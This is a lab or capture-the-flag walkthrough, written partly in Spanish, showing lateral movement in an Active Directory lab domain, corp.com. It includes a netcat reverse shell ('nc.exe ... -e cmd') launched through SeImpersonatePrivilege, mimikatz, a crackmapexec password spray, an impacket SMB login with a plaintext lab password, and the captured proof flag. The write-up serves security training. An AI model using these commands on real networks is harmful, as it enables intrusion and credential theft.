# Walk: Lateral Movement in Active Directory - Capstone - VM Group 3 

## Objetivo
Capstone Exercise: Once VM Group 3 is started, the domain corp.com has been modified. 
Log in as leon on CLIENT74 and use the techniques discussed 
in this Module to move laterally and get the flag on FILES04 Administrator's desktop.

## Procedimiento y comandos
#### Paso 1: Conexion RDP
1. xfreerdp
```bash
┌──(root㉿kali)-[/home/kali]
└─# xfreerdp /u:"leon" /p:'HomeTaping199!' /v:192.168.226.74 /dynamic-resolution +clipboard /cert:ignore
```
2. powershell
```powershell
PS C:\Windows\system32> whoami
corp\leon
PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
PS C:\Windows\system32>

PS C:\Users> Get-Service -Name spooler

Status   Name               DisplayName
------   ----               -----------
Running  spooler            Print Spooler
```
#### Paso 2: Elevar Privilegios en CLIENT74

```powershell
PS C:\Users\leon> .\print.exe -c "C:\Users\leon\nc.exe 192.168.45.213 1234 -e cmd"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
PS C:\Users\leon>
```
* Receptor:

```bash
┌──(root㉿kali)-[/home/kali/OffSec/24-ActiveDirectory-LateralMovment/Capstones]
└─# nc -lvnp 1234                                         
listening on [any] 1234 ...
connect to [192.168.45.213] from (UNKNOWN) [192.168.226.74] 55745
Microsoft Windows [Version 10.0.22000.856]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
#### Paso 3: Obtenemos el hash:
* Ejecutamos mimikatz
```powershell
C:\Tools>.\mimikatz.exe
.\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # 
```
* Propagamos credenciales:
```bash
┌──(root㉿kali)-[/home/kali/OffSec/24-ActiveDirectory-LateralMovment/Capstones]
└─# crackmapexec smb 192.168.226.70-76 -u leon -p "HomeTaping199\!" --continue-on-success
SMB         192.168.226.76  445    CLIENT76         [*] Windows 10 / Server 2016 Build 16299 x64 (name:CLIENT76) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.226.70  445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:corp.com) (signing:True) (SMBv1:False)
SMB         192.168.226.72  445    WEB04            [*] Windows Server 2022 Build 20348 x64 (name:WEB04) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.226.74  445    CLIENT74         [*] Windows 11 Build 22000 x64 (name:CLIENT74) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.226.73  445    FILES04          [*] Windows Server 2022 Build 20348 x64 (name:FILES04) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.226.76  445    CLIENT76         [+] corp.com\leon:HomeTaping199! 
SMB         192.168.226.70  445    DC1              [+] corp.com\leon:HomeTaping199! 
SMB         192.168.226.72  445    WEB04            [+] corp.com\leon:HomeTaping199! 
SMB         192.168.226.74  445    CLIENT74         [+] corp.com\leon:HomeTaping199! (Pwn3d!)
SMB         192.168.226.73  445    FILES04          [+] corp.com\leon:HomeTaping199! (Pwn3d!)
```
* Conexion por smb
```bash
┌──(root㉿kali)-[/home/kali/OffSec/24-ActiveDirectory-LateralMovment]
└─# impacket-smbclient leon:"HomeTaping199\!"@192.168.226.73
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# 
```
* Obtenemos el flag:
```bash
┌──(root㉿kali)-[/home/kali/OffSec/24-ActiveDirectory-LateralMovment]
└─# impacket-smbclient leon:"HomeTaping199\!"@192.168.226.73
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C
C$
docshare
IPC$
Tools
Users
Windows
# use Users
# ls
drw-rw-rw-          0  Tue Sep 26 09:26:17 2023 .
drw-rw-rw-          0  Tue Jul  8 16:33:07 2025 ..
drw-rw-rw-          0  Tue Aug 16 22:02:41 2022 Administrator
drw-rw-rw-          0  Wed Mar  1 08:03:25 2023 Administrator.CORP
drw-rw-rw-          0  Tue Aug 16 22:17:55 2022 All Users
drw-rw-rw-          0  Tue Aug 16 21:19:46 2022 Default
drw-rw-rw-          0  Tue Aug 16 22:17:55 2022 Default User
-rw-rw-rw-        174  Tue Aug 16 22:14:48 2022 desktop.ini
drw-rw-rw-          0  Thu Jan  4 10:26:35 2024 jeff
drw-rw-rw-          0  Wed Sep 21 05:47:09 2022 jeffadmin
drw-rw-rw-          0  Wed Sep 21 05:57:51 2022 jen
drw-rw-rw-          0  Tue Oct  4 05:21:32 2022 leon
drw-rw-rw-          0  Tue Aug 16 22:02:40 2022 Public
drw-rw-rw-          0  Tue Sep 26 09:26:18 2023 stephanie
# cd Administrator
# cd Desktop
# ls
drw-rw-rw-          0  Tue Jul  8 16:32:57 2025 .
drw-rw-rw-          0  Tue Aug 16 22:02:41 2022 ..
-rw-rw-rw-        282  Tue Aug 16 22:02:40 2022 desktop.ini
-rw-rw-rw-         78  Tue Jul  8 16:32:57 2025 proof.txt
# cat proof.txt
OS{94ba2ac50a52c247945e46a394a90eeb}

# 

```

